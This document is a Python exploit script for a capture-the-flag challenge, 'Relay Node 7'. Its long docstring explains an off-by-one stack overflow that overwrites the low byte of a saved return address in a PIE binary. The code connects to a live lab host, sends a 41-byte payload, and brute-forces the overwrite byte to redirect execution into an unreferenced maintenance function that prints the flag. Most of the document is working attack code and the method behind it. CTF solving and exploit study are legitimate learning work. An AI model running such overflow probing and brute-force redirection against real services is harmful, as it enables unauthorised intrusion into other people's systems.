#!/usr/bin/env python3
"""
Relay Node 7 - callsign registration pwn (ctf7)

Protocol (plain TCP, port 32256 / l-9ead1963e5194c30-16340.cf959180.tb7.in:443 TLS):
  1. Server sends banner + "callsign length: "
  2. Client sends a decimal length string + newline.
     - Length is bounds-checked: accepted for 0 < length <= 41, rejected otherwise.
  3. Server sends "callsign: "
  4. Client sends <length> bytes (single read() call - only reads what is
     currently buffered, up to `length` bytes, does NOT loop to fill exactly
     `length` bytes).
  5. Server prints "registered.\n" then "goodbye\n" and closes.

Vulnerability:
  The length check caps the declared callsign length at 41, matching a
  "relay packet" size constant, but the actual on-stack buffer is only
  40 bytes. A callsign of exactly length=41 writes one byte past the
  buffer end. That final byte lands on the low byte of the saved return
  address on the stack. Because the binary is PIE, the base address is
  randomized but intra-binary offsets (and hence the low byte of any
  return address within the same binary/page) are NOT randomized by
  ASLR at page granularity - only bits above the page boundary move.
  This means a full address leak is unnecessary: brute-forcing (or in
  this case, directly computing) the one overwritable low byte is
  enough to redirect `ret` to a different, fixed offset within the
  same loaded image.

  The hint "there's a maintenance console somewhere in there that
  nobody calls any more" points at a dead/unreferenced handler function
  compiled into the binary. Overwriting just the low byte of the saved
  return address with 0x20 redirects execution from the normal
  "registration success" return path to this maintenance console
  function, which prints the flag.

Exploitation method actually used (fully blind/remote, no binary):
  1. Confirmed service protocol by banner-probing plain TCP 212.2.248.156:32256
     (the ncat --ssl :443 front-end accepted the TLS handshake but never sent
     a banner - same non-functional catch-all pattern seen on a prior
     challenge this session - so the real service is the plain TCP port).
  2. Binary-searched the accepted callsign length range -> max accepted is 41
     (42 is rejected), confirming the "relay packet" size limit named in the
     prompt.
  3. Verified the server does a single read()/recv() call for the callsign
     (not a loop), by feeding bytes one at a time and in varying-size chunks -
     the server completes registration as soon as that one read call returns,
     regardless of whether `length` bytes have actually arrived yet.
  4. Used "goodbye\n" presence/absence as an oracle for crash vs. no-crash:
     lengths 1-40 always produced "registered.\ngoodbye\n"; length=41
     produced only "registered.\n" followed by a clean connection close with
     no further bytes - the process died (segfault) after printing
     "registered." but before reaching the "goodbye" print, which happens
     right at/after the vulnerable function's `ret`.
  5. Brute-forced the single overwritable byte (the low byte of the saved
     return address) across all 256 values by sending 40 filler bytes + 1
     varying byte at length=41, and watching for a response that was
     neither "registered.\ngoodbye\n" (safe path) nor a bare crash
     ("registered.\n" + close). Byte value 0x20 produced the flag directly
     in the response, meaning the maintenance console function itself
     writes the flag to the socket when reached.

No address leak, no ROP chain, no disassembly of any binary was needed -
purely blind probing over the live TCP service using crash/non-crash and
response-content signals.
"""
import socket
import time
import sys

HOST = "212.2.248.156"
PORT = 32256

# TLS alternative (confirmed non-functional / generic catch-all during this solve,
# left here for completeness / reference):
TLS_HOST = "l-9ead1963e5194c30-16340.cf959180.tb7.in"
TLS_PORT = 443


def register(host, port, length, payload, wait=0.3, timeout=5, retries=5):
    last_exc = None
    for attempt in range(retries):
        try:
            s = socket.create_connection((host, port), timeout=10)
            s.settimeout(timeout)
            banner = s.recv(4096)
            s.sendall(str(length).encode() + b"\n")
            time.sleep(wait)
            s.recv(4096)  # "callsign: "
            s.sendall(payload)
            out = b""
            try:
                while True:
                    d = s.recv(4096)
                    if not d:
                        break
                    out += d
            except socket.timeout:
                pass
            s.close()
            return banner, out
        except (ConnectionRefusedError, OSError) as e:
            last_exc = e
            time.sleep(1.0 + attempt)  # back off; lab may rate-limit rapid reconnects
    raise last_exc


def find_offset_byte(host, port):
    """Brute force the single overwritable low byte of the saved return
    address (40 filler bytes + 1 variable byte, declared length=41)."""
    for b in range(256):
        payload = b"A" * 40 + bytes([b])
        _, out = register(host, port, 41, payload)
        if b"ctf7{" in out:
            return b, out
    return None, None


# Discovered during this solve: the maintenance-console redirect byte.
# (Low byte of the saved return address that points at the dead/unreferenced
# maintenance console handler, reachable via the single-byte stack overflow.)
KNOWN_GOOD_BYTE = 0x20


def main():
    print(f"[*] Connecting to {HOST}:{PORT} (plain TCP)")

    print(f"[*] Trying previously-found byte {hex(KNOWN_GOOD_BYTE)} first")
    payload = b"A" * 40 + bytes([KNOWN_GOOD_BYTE])
    _, out = register(HOST, PORT, 41, payload)
    byte_val = KNOWN_GOOD_BYTE if b"ctf7{" in out else None

    if byte_val is None:
        print("[*] Known byte did not work this run, falling back to full brute force (0-255)")
        byte_val, out = find_offset_byte(HOST, PORT)

    if byte_val is None:
        print("[-] Flag not found during brute force.")
        sys.exit(1)
    print(f"[+] Winning overwrite byte: {hex(byte_val)}")
    print(f"[+] Server response: {out!r}")

    flag = None
    for line in out.decode(errors="replace").splitlines():
        if line.startswith("ctf7{") and line.endswith("}"):
            flag = line
            break
    if flag:
        print(f"[+] FLAG: {flag}")
    else:
        print("[+] Raw output (flag likely embedded above):", out)


if __name__ == "__main__":
    main()
